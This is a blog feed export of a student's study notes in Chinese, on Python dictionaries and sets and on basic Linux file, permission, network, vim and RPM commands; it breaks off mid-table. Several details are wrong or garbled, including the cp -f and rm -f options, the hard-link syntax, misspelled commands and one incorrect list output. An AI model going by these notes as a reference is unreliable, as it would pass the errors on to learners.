<p><strong>dict()函数的用法</strong><br>​        <strong>创建一个空字典，举例说明：</strong></p>
<p>dict3 = dict()</p>
<p>​    <strong>通过将key和value作为一个序列类型（元组或列表）创建一个字典。举例说明：</strong></p>
<p>dict4 = dict(((‘李宁’,’一切皆有可能’),(‘鱼C工作室’,’让编程改变世界’)))</p>
<p>​    <strong>通过对关键字赋值创建一个字典，注意关键字必须是一个字符串类型且不能加引号，因为程序会默认为其加上一个引号，举例说明：</strong></p>
<p>dict5 = dict(李宁=’一切皆有可能’, 鱼C工作室=’让编程改变世界’)</p>
<p>​    <strong>修改或添加字典元素</strong></p>
<p>通过将变量赋值给字典访问类修改或者增加字典的元素，举例说明：</p>
<p>dict6 = {‘李宁’: ‘一切皆有可能’, ‘鱼C工作室’: ‘让编程改变世界’}<br>dict6[‘李宁’] = ‘打造民族品牌’</p>
<p><strong>当key值存在于字典内时，则重置key的value值</strong></p>
<p><strong>当key值不存在于字典内时，则字典增加一个相（key:value）</strong></p>
<h2 id="26-字典：当索引不好用时2"><a href="#26-字典：当索引不好用时2" class="headerlink" title="26.字典：当索引不好用时2"></a>26.字典：当索引不好用时2</h2><p><strong>fromkeys(iterable, value=None, /) </strong> </p>
<p>创建并返回一个新的字典。其中第一个参数是一个可迭代对象（序列类型），第二个参数是value值，当第二个参数不提供时，则默认为none</p>
<p>访问字典的内置函数，这里主要是访问字典的key的keys()，访问字典的value的values()，访问item的items()。当然也可以直接用get()通过key访问其对应的value。</p>
<p><strong>get(k[,d])</strong></p>
<p>通过key返回对应的value值，第一个参数为key值，第二个参数为默认返回的value值，当key存在则返回对应的value，不存在字典内时返回该值，如果不提供则默认为none</p>
<p><strong>清空字典和复制一个字典函数clear()和copy()。</strong></p>
<p>这里面主要要搞清楚copy()和=赋值的区别，copy()相当于复制出一个新的字典，两者互不影响，而赋值=仅是将字典内存地址赋值出去，两者共同指向一个地址</p>
<p><strong>去除字典一个元素内置函数 pop()、popitem()</strong></p>
<p>pop(k[,d])当k存在字典的key时，在字典内去除该key对应的（key,value），否则返回d的值，当d不提供时返回错误</p>
<p>popitem()去除字典内的一个（key,value），如果字典本身为空时报错</p>
<p><strong>setdefault()</strong></p>
<p>给字典增加一个item，setdefault(k[,d])，返回k对应的value值，当k不在字典内时则返回d的值，如果d没提供则返回空；同时如果k不存在字典内时，将d作为value映射给k</p>
<p><strong>update()</strong></p>
<p>update([E, ]**F) -&gt; None.  Update D from dict/iterable E and F.将一个字典内的item作为item添加到字典内</p>
<h2 id="27-集合：在我的世界里，你就是唯一"><a href="#27-集合：在我的世界里，你就是唯一" class="headerlink" title="27.集合：在我的世界里，你就是唯一"></a>27.集合：在我的世界里，你就是唯一</h2><p><strong>集合的概念和使用</strong><br>​        在这里集合的概念和数学里集合的概念是一致的，都是一组元素的集，且元素之间不能重复。Python中集合的定义和字典类似，都需要大括号，区别在于集合不需要映射</p>
<p><strong>set()函数</strong><br>​        和序列工厂函数list()，str()，tuple()一样，可以将序列类型直接强制转换为一个集合类型</p>
<p>一个列表[1,2,3,4,5,5,3,1,0]，如何去除列表内的重复元素，两种方法可供选择，第一种是常规方法，见下面所示：</p>
<p>list2 = [1,2,3,4,5,5,3,1,0]<br>list3 = []<br>for each in list2:<br>     if each not in list3:<br>             list3.append(each)<br>list3<br> 2, 3, 4, 5, 0]<br>     第二种方法使用集合的元素不重复性，通过将列表先强制转换为集合，再转换为列表形式实现，举例说明<br>list4 = [1,2,3,4,5,5,3,1,0]<br>list4 = list(set(list4))<br>list4<br> [1, 2, 3, 4, 5]</p>
<p><strong>add()</strong></p>
<p>增加一个元素到集合内</p>
<p><strong>remove()</strong></p>
<p>从集合内删除一个元素</p>
<p><strong>frozenset()</strong></p>
<p>将一个集合冻结使之无法添加和删除元素的函数</p>
<h2 id="28-文件：因为懂你，所以永恒"><a href="#28-文件：因为懂你，所以永恒" class="headerlink" title="28.文件：因为懂你，所以永恒"></a>28.文件：因为懂你，所以永恒</h2><h2 id="29-文件：一个任务"><a href="#29-文件：一个任务" class="headerlink" title="29.文件：一个任务"></a>29.文件：一个任务</h2><h2 id="30-文件系统：介绍一个高大上的东西"><a href="#30-文件系统：介绍一个高大上的东西" class="headerlink" title="30.文件系统：介绍一个高大上的东西"></a>30.文件系统：介绍一个高大上的东西</h2><p><strong>模块的概念</strong><br>​        模块就是实现特定功能的一类函数和变量的文件，后缀名是.py，它可以被其他程序所调用，调用语句是import。在Python程序中要是用模块的函数需要在前面加上模块名和成员操作符</p>
<p><strong>os模块</strong><br>​        Python之所以称为跨平台的语言就是因为它具有os模块，使得同样的源代码可以在不同的操作系统上使用。</p>
<p><strong>os.path模块是完成跟文件路径相关的函数模块</strong></p>
<p><a href="http://bbs.fishc.com/thread-45512-1-1.html" target="_blank" rel="noopener">os、os.path 模块中关于文件、目录常用的函数使用方法</a></p>
<h2 id="31-永久存储：腌制一缸美味的跑操"><a href="#31-永久存储：腌制一缸美味的跑操" class="headerlink" title="31.永久存储：腌制一缸美味的跑操"></a>31.永久存储：腌制一缸美味的跑操</h2><h2 id="32-异常处理：你不可能总是对的"><a href="#32-异常处理：你不可能总是对的" class="headerlink" title="32.异常处理：你不可能总是对的"></a>32.异常处理：你不可能总是对的</h2><h2 id="33-异常处理：你不可能总是对的2"><a href="#33-异常处理：你不可能总是对的2" class="headerlink" title="33.异常处理：你不可能总是对的2"></a>33.异常处理：你不可能总是对的2</h2></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> Notes </tag>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux初探]]></title>
      <url>/2018/01/04/linux/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>线代，网页制作都考完了，过几天才考高数，所以有几天空闲时间，就赶紧恶补一下linux吧！<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<h1 id="文件处理命令"><a href="#文件处理命令" class="headerlink" title="文件处理命令"></a>文件处理命令</h1><h2 id="目录处理命令"><a href="#目录处理命令" class="headerlink" title="目录处理命令"></a>目录处理命令</h2><h3 id="ls-显示目录文件"><a href="#ls-显示目录文件" class="headerlink" title="ls 显示目录文件"></a>ls 显示目录文件</h3><p><strong>grammar: ls [-ald]【文件或目录】</strong></p>
<p>-a 显示所有文件，包括隐藏文件</p>
<p>-l 详细信息展示 -h 人性化显示</p>
<p>-d 查看目录属性</p>
<p>-i</p>
<h3 id="mkdir-创建新目录"><a href="#mkdir-创建新目录" class="headerlink" title="mkdir 创建新目录"></a>mkdir 创建新目录</h3><p><strong>grammar: mkdir -p [目录名]</strong></p>
<p>-p 递归创建</p>
<h3 id="cd-切换目录"><a href="#cd-切换目录" class="headerlink" title="cd 切换目录"></a>cd 切换目录</h3><p><strong>grammar: cd [目录名]</strong></p>
<p><strong>..</strong>  -&gt;当前目录的上一级目录</p>
<p><strong>.</strong>   -&gt;当前目录</p>
<h3 id="pwd-显示当前目录"><a href="#pwd-显示当前目录" class="headerlink" title="pwd 显示当前目录"></a>pwd 显示当前目录</h3><h3 id="rmdir-删除空目录"><a href="#rmdir-删除空目录" class="headerlink" title="rmdir 删除空目录"></a>rmdir 删除空目录</h3><p><strong>grammar: rmdir  [目录名]</strong></p>
<h3 id="cp-复制"><a href="#cp-复制" class="headerlink" title="cp 复制"></a>cp 复制</h3><p><strong>grammar: cp [原文件或目录]【目标目录】</strong></p>
<p>-f 复制目录</p>
<p>-p 保留文件属性</p>
<h3 id="mv-剪切-改名"><a href="#mv-剪切-改名" class="headerlink" title="mv 剪切/改名"></a>mv 剪切/改名</h3><p><strong>grammar: mv [原文件或目录]【目标目录】</strong></p>
<h3 id="rm-删除"><a href="#rm-删除" class="headerlink" title="rm 删除"></a>rm 删除</h3><p><strong>grammar: rm [文件或目录]</strong></p>
<p>-rf [文件或目录]</p>
<p>-f 删除目录</p>
<p>-f 强制执行</p>
<p><br></p>
<h2 id="文件处理命令-1"><a href="#文件处理命令-1" class="headerlink" title="文件处理命令"></a>文件处理命令</h2><h3 id="touch-创建空文件"><a href="#touch-创建空文件" class="headerlink" title="touch 创建空文件"></a>touch 创建空文件</h3><p><strong>grammar: touch [文件名]</strong></p>
<h3 id="cat-显示文件内容"><a href="#cat-显示文件内容" class="headerlink" title="cat 显示文件内容"></a>cat 显示文件内容</h3><p><strong>grammar: cat [文件名]</strong></p>
<p>-n 显示行号</p>
<h3 id="tac-显示文件内容（反向）"><a href="#tac-显示文件内容（反向）" class="headerlink" title="tac 显示文件内容（反向）"></a>tac 显示文件内容（反向）</h3><p><strong>grammar: tac [文件名]</strong></p>
<h3 id="more-分页显示文件内容"><a href="#more-分页显示文件内容" class="headerlink" title="more 分页显示文件内容"></a>more 分页显示文件内容</h3><p><strong>grammar: more [文件名]</strong></p>
<p>空格/f      -&gt;翻页</p>
<p>回车      -&gt;换行</p>
<p>q或Q     -&gt;退出</p>
<h3 id="less-分页显示文件内容（可向上翻页）"><a href="#less-分页显示文件内容（可向上翻页）" class="headerlink" title="less 分页显示文件内容（可向上翻页）"></a>less 分页显示文件内容（可向上翻页）</h3><p><strong>grammar: less [文件名]</strong></p>
<p>搜索：<strong>/关键词</strong></p>
<h3 id="head-显示文件前几行"><a href="#head-显示文件前几行" class="headerlink" title="head 显示文件前几行"></a>head 显示文件前几行</h3><p><strong>grammar: head [文件名]</strong></p>
<p>-n 制定行数（默认10）</p>
<h3 id="tail-显示文件后面几行"><a href="#tail-显示文件后面几行" class="headerlink" title="tail 显示文件后面几行"></a>tail 显示文件后面几行</h3><p><strong>grammar: tail [文件名]</strong></p>
<p>-n 指定行数</p>
<p>-f 动态显示文件末尾内容</p>
<p><br></p>
<h2 id="链接命令"><a href="#链接命令" class="headerlink" title="链接命令"></a>链接命令</h2><h3 id="ln-生成链接文件"><a href="#ln-生成链接文件" class="headerlink" title="ln 生成链接文件"></a>ln 生成链接文件</h3><h4 id="软链接："><a href="#软链接：" class="headerlink" title="软链接："></a>软链接：</h4><p><strong>grammar: ln -s [原文件]【目标文件】</strong></p>
<p>类似windows的快捷方式</p>
<p>-s 创建软链接</p>
<p>1.lrwxrwxrwx   <strong>l -&gt;软链接</strong></p>
<p>2.文件很小</p>
<p>3.箭头指向源文件</p>
<h4 id="硬链接："><a href="#硬链接：" class="headerlink" title="硬链接："></a>硬链接：</h4><p><strong>grammar: ls  [原文件]【目标文件】</strong></p>
<p>除了位置不一样，其余都一样（像cp -p 一样）</p>
<ol>
<li><p>cp -p + 同步更新</p>
<p>echo “123456” &gt;&gt;/etc/issue</p>
</li>
<li><p>通过 <strong>i</strong> 节点识别</p>
</li>
<li><p>不能跨分区</p>
</li>
<li><p>不能针对目录使用</p>
</li>
</ol>
<h1 id="权限管理命令"><a href="#权限管理命令" class="headerlink" title="权限管理命令"></a>权限管理命令</h1><p><strong>权限的数字表示</strong></p>
<p>r  —-  4</p>
<p>w —- 2</p>
<p>x  —- 1</p>
<p>rwxrw-r–</p>
<p>7    6    4</p>
<h3 id="chmod-改变文件或目录权限"><a href="#chmod-改变文件或目录权限" class="headerlink" title="chmod 改变文件或目录权限"></a>chmod 改变文件或目录权限</h3><p><strong>grammar: chgmod  [{ugoa} {+-=} [文件或目录] </strong></p>
<p>-R 递归修改</p>
<table>
<thead>
<tr>
<th style="text-align:center">代表字符</th>
<th style="text-align:center">权限</th>
<th style="text-align:center">对文件的含义</th>
<th style="text-align:center">对目录的含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">r</td>
<td style="text-align:center">读权限</td>
<td style="text-align:center">可以查看文件内容(cat/more/head/tail……)</td>
<td style="text-align:center">可以列出目录中的内容(ls)\</td>
<td></td>
</tr>
<tr>
<td style="text-align:center">w</td>
<td style="text-align:center">写权限</td>
<td style="text-align:center">可以修改文件内容(vim)</td>
<td style="text-align:center">可以在目录中创建、删除文件(touch/mkdir/rmdir/rm)</td>
</tr>
<tr>
<td style="text-align:center">x</td>
<td style="text-align:center">执行权限</td>
<td style="text-align:center">可以执行文件(script/command)</td>
<td style="text-align:center">可以进入目录(cd)\</td>
</tr>
</tbody>
</table>
<h3 id="chown-改变文件或目录的所有者"><a href="#chown-改变文件或目录的所有者" class="headerlink" title="chown 改变文件或目录的所有者"></a>chown 改变文件或目录的所有者</h3><p><strong>grammar: chown [用户]【文件或目录】</strong></p>
<h3 id="chgrp-改变文件或目录所属组"><a href="#chgrp-改变文件或目录所属组" class="headerlink" title="chgrp 改变文件或目录所属组"></a>chgrp 改变文件或目录所属组</h3><p><strong>grammar: chgrp [用户组]【文件或目录】</strong></p>
<h3 id="umask-显示、设置文件的缺省权限"><a href="#umask-显示、设置文件的缺省权限" class="headerlink" title="umask 显示、设置文件的缺省权限"></a>umask 显示、设置文件的缺省权限</h3><p><strong>grammar: umask [-S]</strong></p>
<p>-S 以rwx形式显示新建文件的缺省权限</p>
<p>umask 022  -&gt; 755</p>
<h1 id="文件搜索命令"><a href="#文件搜索命令" class="headerlink" title="文件搜索命令"></a>文件搜索命令</h1><h3 id="find-文件搜索"><a href="#find-文件搜索" class="headerlink" title="find 文件搜索"></a>find 文件搜索</h3><p><strong>grammar: find [搜索范围]【匹配条件】</strong></p>
<p>-name [name]</p>
<p>(-iname 不区分大小写)</p>
<p>-size [+/- ]</p>
<p>一个数据块 512字节 0.5k</p>
<p>-user</p>
<p>-group</p>
<p>-cmin -5</p>
<p>文件属性 change</p>
<p>-amin -5</p>
<p>访问时间 access</p>
<p>-mmin -5</p>
<p>文件内容 modify</p>
<p>-exec/ok cmd {} \; </p>
<p>对搜索结果执行命令</p>
<p>-type 根据文件类型查找</p>
<p> f 文件        d 目录        l 软链接文件</p>
<p>-inum 根据i节点查找</p>
<p><strong>-a</strong> 两个条件同时满足     <strong>-o</strong> 两个条件满足一个即可</p>
<p>eg: find /etc -size +163840 -a -size -204800</p>
<h3 id="locate-在文件资料库中查找文件"><a href="#locate-在文件资料库中查找文件" class="headerlink" title="locate 在文件资料库中查找文件"></a>locate 在文件资料库中查找文件</h3><p><strong>grammar: locate [文件名]</strong></p>
<p>updatedb</p>
<h3 id="which-搜索命令所在目录及别名信息"><a href="#which-搜索命令所在目录及别名信息" class="headerlink" title="which 搜索命令所在目录及别名信息"></a>which 搜索命令所在目录及别名信息</h3><p><strong>grammar: which [命令]</strong></p>
<h3 id="whereis-搜索命令所在目录及帮助文档路径"><a href="#whereis-搜索命令所在目录及帮助文档路径" class="headerlink" title="whereis 搜索命令所在目录及帮助文档路径"></a>whereis 搜索命令所在目录及帮助文档路径</h3><p><strong>grammar: whereis [命令]</strong></p>
<h3 id="grep-在文件中搜寻字符串匹配的行并输出"><a href="#grep-在文件中搜寻字符串匹配的行并输出" class="headerlink" title="grep 在文件中搜寻字符串匹配的行并输出"></a>grep 在文件中搜寻字符串匹配的行并输出</h3><p><strong>grammar: grep [指定字符串]【文件】</strong></p>
<p>-i 不区分大小写</p>
<p>-v 排除指定字符串 (^#   -&gt; 行首#)</p>
<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><h3 id="man-获得帮助信息"><a href="#man-获得帮助信息" class="headerlink" title="man 获得帮助信息"></a>man 获得帮助信息</h3><p><strong>grammar: man [命令或者配置文件]</strong></p>
<p>1 命令的帮助 man ls</p>
<p>5 配置文件的帮助 man services</p>
<h3 id="whatis-命令"><a href="#whatis-命令" class="headerlink" title="whatis [命令]"></a>whatis [命令]</h3><h3 id="apropos-命令"><a href="#apropos-命令" class="headerlink" title="apropos [命令]"></a>apropos [命令]</h3><h3 id="命令-–help"><a href="#命令-–help" class="headerlink" title="[命令] –help"></a>[命令] –help</h3><h3 id="info"><a href="#info" class="headerlink" title="info"></a>info</h3><h3 id="help-获取Shell内置命令的帮助信息"><a href="#help-获取Shell内置命令的帮助信息" class="headerlink" title="help 获取Shell内置命令的帮助信息"></a>help 获取Shell内置命令的帮助信息</h3><p><strong>grammar: help [命令]</strong></p>
<p>找不到路径的命令，都是shell命令</p>
<h2 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h2><h3 id="useradd-添加新用户"><a href="#useradd-添加新用户" class="headerlink" title="useradd 添加新用户"></a>useradd 添加新用户</h3><p><strong>grammar: useradd karma</strong></p>
<h3 id="passwd-设置用户密码"><a href="#passwd-设置用户密码" class="headerlink" title="passwd 设置用户密码"></a>passwd 设置用户密码</h3><p><strong>grammar: passwd karma</strong></p>
<h3 id="who-查看登录用户信息"><a href="#who-查看登录用户信息" class="headerlink" title="who 查看登录用户信息"></a>who 查看登录用户信息</h3><p><strong>grammar: who</strong></p>
<p>tty 本地终端        pts 远程终端</p>
<h3 id="w-查看登录用户详细信息"><a href="#w-查看登录用户详细信息" class="headerlink" title="w 查看登录用户详细信息"></a>w 查看登录用户详细信息</h3><p><strong>grammar: w</strong></p>
<h1 id="压缩解压命令"><a href="#压缩解压命令" class="headerlink" title="压缩解压命令"></a>压缩解压命令</h1><h3 id="gzip-压缩文件"><a href="#gzip-压缩文件" class="headerlink" title="gzip 压缩文件"></a>gzip 压缩文件</h3><p><strong>grammar: gzip [文件]</strong></p>
<p>解压： gunzip  或 gzip -d</p>
<p>不保留原文件，只能压缩文件</p>
<h3 id="tar-打包目录"><a href="#tar-打包目录" class="headerlink" title="tar 打包目录"></a>tar 打包目录</h3><p><strong>grammar: tar 选项[-zcf] 【压缩后的文件名】[目录]</strong></p>
<p>-c 打包    -v 显示详细信息    -f 指定文件名        -z 打包同时压缩     -x 解包</p>
<h3 id="zip-压缩文件或目录"><a href="#zip-压缩文件或目录" class="headerlink" title="zip 压缩文件或目录"></a>zip 压缩文件或目录</h3><p><strong>grammar: zip [-r] 【压缩后的文件名】[目录]</strong></p>
<p>-r 压缩目录</p>
<h3 id="bzip2-压缩文件"><a href="#bzip2-压缩文件" class="headerlink" title="bzip2 压缩文件"></a>bzip2 压缩文件</h3><p><strong>grammar: bzip2 选项[-k] 【文件】</strong></p>
<p>-k 产生压缩文件后保留原文件</p>
<h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h2><h3 id="write-给用户发信息"><a href="#write-给用户发信息" class="headerlink" title="write 给用户发信息"></a>write 给用户发信息</h3><p><strong>grammar: write [用户名] </strong></p>
<p>Ctrl+D 保存结束</p>
<h3 id="wall-发广播信息"><a href="#wall-发广播信息" class="headerlink" title="wall 发广播信息"></a>wall 发广播信息</h3><p><strong>grammar: wall [message] </strong></p>
<h3 id="ping-测试网络连通性"><a href="#ping-测试网络连通性" class="headerlink" title="ping 测试网络连通性"></a>ping 测试网络连通性</h3><p><strong>grammar: ping 选项[-c] 【IP地址】</strong></p>
<p>-c 指定发送次数</p>
<h3 id="ifconfig-查看和设置网卡信息"><a href="#ifconfig-查看和设置网卡信息" class="headerlink" title="ifconfig 查看和设置网卡信息"></a>ifconfig 查看和设置网卡信息</h3><p><strong>grammar: ifconfig [网卡名称] 【ip地址】</strong></p>
<p>临时改</p>
<h3 id="mail-查看发送电子邮件"><a href="#mail-查看发送电子邮件" class="headerlink" title="mail 查看发送电子邮件"></a>mail 查看发送电子邮件</h3><p><strong>grammar: mail [用户名] </strong></p>
<h3 id="last-列出目前与过去登入系统的用户信息"><a href="#last-列出目前与过去登入系统的用户信息" class="headerlink" title="last 列出目前与过去登入系统的用户信息"></a>last 列出目前与过去登入系统的用户信息</h3><p><strong>grammar: last </strong></p>
<h3 id="lastlog-检查某特定用户上次登录时间"><a href="#lastlog-检查某特定用户上次登录时间" class="headerlink" title="lastlog 检查某特定用户上次登录时间"></a>lastlog 检查某特定用户上次登录时间</h3><p><strong>grammar: lastlog -u [uid]</strong> </p>
<h3 id="traceroute-显示数据包到主机间的路径"><a href="#traceroute-显示数据包到主机间的路径" class="headerlink" title="traceroute 显示数据包到主机间的路径"></a>traceroute 显示数据包到主机间的路径</h3><p><strong>grammar: traceroute</strong></p>
<h3 id="netstat-显示网络相关信息"><a href="#netstat-显示网络相关信息" class="headerlink" title="netstat 显示网络相关信息"></a>netstat 显示网络相关信息</h3><p><strong>grammar: netstat [选项] </strong></p>
<p>-t TCP协议    -u UDP协议    -l 监听    -r 路由    -n 显示ip地址和端口号</p>
<p>常用：</p>
<p>netstat -tlum        查看本机监听的端口</p>
<p>netstat -an        查看本机所有的网络连接</p>
<p>netstat -rn        查看本机路由表</p>
<h3 id="steup-配置网络"><a href="#steup-配置网络" class="headerlink" title="steup 配置网络"></a>steup 配置网络</h3><p><strong>grammar: steup </strong></p>
<p>Dhcp</p>
<h3 id="mount-挂载命令"><a href="#mount-挂载命令" class="headerlink" title="mount 挂载命令"></a>mount 挂载命令</h3><p><strong>grammar: mount[-t 文件系统] 设备文件名 挂载点 </strong></p>
<p>卸载 umount</p>
<h2 id="关机重启命令"><a href="#关机重启命令" class="headerlink" title="关机重启命令"></a>关机重启命令</h2><h3 id="关机"><a href="#关机" class="headerlink" title="关机"></a>关机</h3><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><p><strong>grammar: shutdown [选项] 时间</strong></p>
<p>-c 取消前一个关机命令        -h 关机        -r 重启</p>
<h4 id="halt"><a href="#halt" class="headerlink" title="halt"></a>halt</h4><h4 id="power-off"><a href="#power-off" class="headerlink" title="power off"></a>power off</h4><h4 id="init-0"><a href="#init-0" class="headerlink" title="init 0"></a>init 0</h4><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><h4 id="reboot"><a href="#reboot" class="headerlink" title="reboot"></a>reboot</h4><h4 id="init-6"><a href="#init-6" class="headerlink" title="init 6"></a>init 6</h4><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>修改系统默认运行级别</p>
<p>cat /etc/inittab</p>
<p>Id:3:initdefault</p>
<p>查询系统运行级别</p>
<p>runlevel</p>
<p>系统运行级别</p>
<p>0 关机        1 单用户        2 不完全多用户，不含NFS服务        3 完全多用户        4 未分配        5 图形界面        6 重启</p>
<h3 id="退出登录"><a href="#退出登录" class="headerlink" title="退出登录"></a>退出登录</h3><h4 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h4><h2 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h2><h3 id="定位命令"><a href="#定位命令" class="headerlink" title="定位命令"></a>定位命令</h3><p>设置行号 <strong>: set nu</strong></p>
<p>取消行号 <strong>:set nonu</strong></p>
<p>到第一行 <strong>gg</strong></p>
<p>到最后一行 <strong>G</strong></p>
<p>到第n行 <strong>nG</strong></p>
<p>到第n行 <strong>:n</strong></p>
<p><strong>$</strong> 移至行尾</p>
<p><strong>0</strong> 移至行首</p>
<h3 id="插入命令"><a href="#插入命令" class="headerlink" title="插入命令"></a>插入命令</h3><p><strong>a</strong> 在光标所在字符后插入</p>
<p><strong>A</strong> 在光标所在行尾插入</p>
<p><strong>i</strong> 在光标所在字符前插入</p>
<p><strong>I</strong> 在光标所在行行首插入</p>
<p><strong>o</strong> 在光标下插入新行</p>
<p><strong>O</strong> 在光标上插入新行</p>
<h3 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h3><p><strong>x</strong> 删除光标所在处字符</p>
<p><strong>nx</strong> 删除光标所在处n后个字符</p>
<p><strong>dd</strong> 删除光标所在行，ndd删除n行</p>
<p><strong>dG</strong> 删除光标所在行到文件末尾内容</p>
<p><strong>D</strong> 删除光标所在处到行尾内容</p>
<p><strong>:n1,n2d</strong> 删除指定范围的行</p>
<h3 id="复制和剪切命令"><a href="#复制和剪切命令" class="headerlink" title="复制和剪切命令"></a>复制和剪切命令</h3><p><strong>yy</strong> 复制当前行</p>
<p><strong>nyy</strong> 复制当前行以下n行</p>
<p><strong>dd</strong> 剪切当前行</p>
<p><strong>ndd</strong> 剪切当前行以下n行 </p>
<p><strong>p、P</strong> 粘贴在当前光标所在行下或行上</p>
<h3 id="替换和取消命令"><a href="#替换和取消命令" class="headerlink" title="替换和取消命令"></a>替换和取消命令</h3><p><strong>r</strong> 取代光标所在处字符</p>
<p><strong>R</strong> 从光标所在处开始替换字符，按Esc结束</p>
<p><strong>u</strong> 取消上一步操作</p>
<h3 id="搜索和搜索替换"><a href="#搜索和搜索替换" class="headerlink" title="搜索和搜索替换"></a>搜索和搜索替换</h3><p><strong>/string</strong> 搜索指定字符串，搜索时忽略大小写<strong>:set ic</strong></p>
<p><strong>n</strong> 搜索指定字符串的下一个出现位置</p>
<p><strong>:%s/要替换的关键词1/替换的关键词2/g</strong> 全文替换指定字符串</p>
<p><strong>:n1,n2s/要替换的关键词1/替换的关键词2/g</strong> 在一定范围内替换指定字符串</p>
<h3 id="保存和退出"><a href="#保存和退出" class="headerlink" title="保存和退出"></a>保存和退出</h3><p><strong>:w</strong> 保存修改</p>
<p><strong>:w new_filename</strong> 另存为指定文件</p>
<p><strong>wq</strong> 保存修改并退出</p>
<p><strong>ZZ</strong> 快捷键，保存修改并退出</p>
<p><strong>:q!</strong> v 不保存修改退出</p>
<p><strong>:wq!</strong> 保存修改并退出（文件所有者及root可使用）</p>
<h3 id="导入命令执行结果"><a href="#导入命令执行结果" class="headerlink" title="导入命令执行结果"></a>导入命令执行结果</h3><p><strong>:r !命令</strong></p>
<h3 id="定义快捷键"><a href="#定义快捷键" class="headerlink" title="定义快捷键"></a>定义快捷键</h3><p><strong>:map 快捷键 触发命令</strong></p>
<h3 id="连续行注释"><a href="#连续行注释" class="headerlink" title="连续行注释"></a>连续行注释</h3><p><strong>:n1,n2s/^/#/g</strong></p>
<p><strong>:n1,n2s/^#//g</strong></p>
<p><strong>:n1,n2s/^/\/\//g</strong></p>
<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><p>设置 vim /root/.vimrc    vim /home/username/.vimrc</p>
<p><strong>:ab mymail <a href="mailto:abc@kkk.com" target="_blank" rel="noopener">abc@kkk.com</a> </strong>类似于文本替换</p>
<h2 id="软件包"><a href="#软件包" class="headerlink" title="软件包"></a>软件包</h2><h3 id="软件包分类"><a href="#软件包分类" class="headerlink" title="软件包分类"></a>软件包分类</h3><h4 id="源码包"><a href="#源码包" class="headerlink" title="源码包"></a>源码包</h4><p>优点：</p>
<ol>
<li>开源</li>
<li>可以自由选择所需功能</li>
<li>软件是编译安装，稳定性和效率更好</li>
<li>卸载方便</li>
</ol>
<p>缺点：</p>
<ol>
<li>安装步骤多</li>
<li>编译过程时间较长，安装比二进制安装时间长</li>
<li>编译安装，安装过程中一旦报错，新手很难解决</li>
</ol>
<h4 id="二进制包（RPM包、系统默认包）"><a href="#二进制包（RPM包、系统默认包）" class="headerlink" title="二进制包（RPM包、系统默认包）"></a>二进制包（RPM包、系统默认包）</h4><p>优点：</p>
<ol>
<li>包管理系统简单</li>
<li>安装速度比源码包快得多</li>
</ol>
<p>缺点：</p>
<ol>
<li>经过编译，不再可以看到源代码</li>
<li>功能选择不如源码包灵活</li>
<li>依赖性</li>
</ol>
<h3 id="RPM命令管理"><a href="#RPM命令管理" class="headerlink" title="RPM命令管理"></a>RPM命令管理</h3><h4 id="RPM包命名原则"><a href="#RPM包命名原则" class="headerlink" title="RPM包命名原则"></a>RPM包命名原则</h4><p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fnqa43wzntj30vm0mmq9x.jpg" width="50%"></p>
<h4 id="RPM包依赖性"><a href="#RPM包依赖性" class="headerlink" title="RPM包依赖性"></a>RPM包依赖性</h4><h4 id="包全名与包名"><a href="#包全名与包名" class="headerlink" title="包全名与包名"></a>包全名与包名</h4><p>包全名：操作的包是没有安装的软件包时，使用包全名。而且要注意路径</p>
<p>包名：操作已经安装的软件包时，使用包名。是搜索/var/lib/rpm/中的数据库</p>
<h4 id="RPM安装"><a href="#RPM安装" class="headerlink" title="RPM安装"></a>RPM安装</h4><p>-i (install)    安装</p>
<p>-v (verbose)    显示详细信息</p>
<p>-h (hash)    显示进度</p>
<p>–nodeps    不检测依赖性</p>
<h4 id="RPM升级"><a href="#RPM升级" class="headerlink" title="RPM升级"></a>RPM升级</h4><p>-U</p>
<h4 id="RPM卸载"><a href="#RPM卸载" class="headerlink" title="RPM卸载"></a>RPM卸载</h4><p>-e (erase 卸载)</p>
<h4 id="RPM查询"><a href="#RPM查询" class="headerlink" title="RPM查询"></a>RPM查询</h4><ol>
<li>查询是否安装</li>
</ol>
<p><strong>grammar: rpm -q 包名</strong></p>
<p>-q 查询(query)</p>
<p>-a 所有(all)</p>
<ol>
<li>查询软件包详细信息</li>
</ol>
<p><strong>grammar: rpm -qi 包名</strong></p>
<p>-i 查询软件信息(information)</p>
<p>-p 查询未安装包信息(package)</p>
<ol>
<li>查询包中文件安装位置</li>
</ol>
<p><strong>grammar: rpm -ql 包名</strong></p>
<p>-l 列表(list)</p>
<p>-p 查询未安装包信息</p>
<ol>
<li>查询系统文件属于哪个RPM包</li>
</ol>
<p><strong>grammar: rpm -qf 文件名</strong></p>
<p>-f 查询系统文件属于哪个软件包(file)</p>
<ol>
<li>查询软件包的依赖性</li>
</ol>
<p><strong>grammar: rpm -qR 包名</strong></p>
<p>-R 查询软件包的依赖性(requires)</p>
<p>-p 查询未安装包信息(package)</p>
<h4 id="RPM包校验"><a href="#RPM包校验" class="headerlink" title="RPM包校验"></a>RPM包校验</h4><p>-V (verify)校验指定RPM包中的文件</p>
<p>验证内容信息对应如下</p>
<table>
<thead>
<tr>
<th style="text-align:center">S</th>
<th style="text-align:center">文件大小是否改变</th>
<th style="text-align:center">M</th>
<th style="text-align:center">文件的类型或文件的权限(rwx)是否被改变</th>
</tr>
</thead>
<tbody>
<tr>
